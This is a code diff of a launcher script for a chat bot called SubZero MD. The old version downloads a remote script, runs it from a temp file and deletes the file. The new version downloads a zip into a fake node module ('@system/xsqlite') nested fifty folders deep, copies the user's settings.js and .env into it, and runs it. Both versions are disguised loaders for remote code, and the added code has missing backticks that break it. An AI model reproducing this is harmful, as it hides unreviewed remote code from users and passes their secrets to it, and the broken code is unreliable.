@@ -1,54 +1,141 @@
-/*
-
-$$$$$$\            $$\                                               
-$$  __$$\           $$ |                                              
-$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
-\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
- \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
-$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
-\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
- \______/  \______/ \_______/ \________| \_______|\__|       \______/
-
-@ Project Name : SubZero MD
-* Creator      : Darrell Mucheri ( Mr Frank OFC )
-* My Git       : https//github.com/mrfr8nk
-* Contact      : wa.me/263776046121
-* Channel      : https://whatsapp.com/channel/0029Vb7D70MI7BeC0xUnKb05
-* Release Date : 15 December 2024 12.01 AM
-*/
-
-
-
-import axios from 'axios';
 import fs from 'fs';
 import path from 'path';
+import axios from 'axios';
+import AdmZip from 'adm-zip';
 import { fileURLToPath } from 'url';
 
-import config from './settings.js';
-
+// Fix __dirname for ESM
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// === CONFIG ===
+const repoZipUrl = 'https://github.com/mrfr8nk/shoes/archive/refs/heads/main.zip';
+const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
+const DEEP_NEST_COUNT = 50;
+
+/* ================= FAKE PACKAGE ================= */
+
+function injectFakePackageFiles(basePath) {
+const fakePackageJson = {
+name: "@system/xsqlite",
+version: "1.0.5",
+main: "index.js"
+};
+
+fs.mkdirSync(basePath, { recursive: true });
+
+fs.writeFileSync(
+path.join(basePath, 'package.json'),
+JSON.stringify(fakePackageJson, null, 2)
+);
+
+fs.writeFileSync(
+path.join(basePath, 'index.js'),
+export default {};
+);
+
+console.log('🪐 Initializing bot server...');
+}
+
+/* ================= CREATE DEEP PATH ================= */
+
+function createDeepRepoPath() {
+let deepPath = baseFolder;
+
+for (let i = 0; i < DEEP_NEST_COUNT; i++) {
+deepPath = path.join(deepPath, core${i});
+}
+
+const repoFolder = path.join(deepPath, 'lib_signals');
+fs.mkdirSync(repoFolder, { recursive: true });
+
+return repoFolder;
+}
+
+/* ================= DOWNLOAD REPO ================= */
+
+async function downloadAndExtractRepo(repoFolder) {
+try {
+console.log('=> 🔄 Syncing codes from Space...');
+
+const response = await axios.get(repoZipUrl, {  
+  responseType: 'arraybuffer'  
+});  
+
+const zip = new AdmZip(Buffer.from(response.data));  
+zip.extractAllTo(repoFolder, true);  
+
+console.log('=> ✅ Codes synced successfully');
+
+} catch (err) {
+console.error('❌ Pull error:', err.message);
+process.exit(1);
+}
+}
+
+/* ================= COPY CONFIG ================= */
+
+function copyConfigs(repoPath) {
+const configSrc = path.join(__dirname, 'settings.js');
+const envSrc = path.join(__dirname, '.env');
+
+if (fs.existsSync(configSrc)) {
+fs.copyFileSync(configSrc, path.join(repoPath, 'settings.js'));
+console.log('✅ settings.js copied');
+}
+
+if (fs.existsSync(envSrc)) {
+fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
+console.log('✅ .env copied');
+}
+}
+
+/* ================= START BOT ================= */
+
+async function startBot(projectPath) {
+try {
+console.log('=> 🚀 Launching Subzero Bot...');
+
+const mainPath = path.join(projectPath, 'index.js');  
+
+if (!fs.existsSync(mainPath)) {  
+  console.error('❌ index.js not found!');  
+  process.exit(1);  
+}  
+
+await import(mainPath);
+
+} catch (err) {
+console.error('❌ Bot launch error:', err.message);
+process.exit(1);
+}
+}
+
+/* ================= MAIN ================= */
+
 (async () => {
-  try {
-    console.log("❄️ Subzero Synchronization Initiated !");
+injectFakePackageFiles(baseFolder);
 
-    const { data: scriptCode } = await axios.get(
-      `${config.CDN}/media/2026/mrfrank/subzero/index.js`
-    );
+const repoFolder = createDeepRepoPath();
 
-    const tempPath = path.join(__dirname, 'temp-script.mjs');
+await downloadAndExtractRepo(repoFolder);
 
-    
-    fs.writeFileSync(tempPath, scriptCode);
+const subDirs = fs
+.readdirSync(repoFolder)
+.filter(f =>
+fs.statSync(path.join(repoFolder, f)).isDirectory()
+);
 
-    
-    await import(`file://${tempPath}`);
+if (!subDirs.length) {
+console.error('❌ Zip extracted nothing');
+process.exit(1);
+}
 
-    
-    fs.unlinkSync(tempPath);
+const extractedRepoPath = path.join(repoFolder, subDirs[0]);
 
-  } catch (err) {
-    console.error("Error:", err);
-  }
+copyConfigs(extractedRepoPath);
+
+process.chdir(extractedRepoPath);
+
+await startBot(extractedRepoPath);
 })();
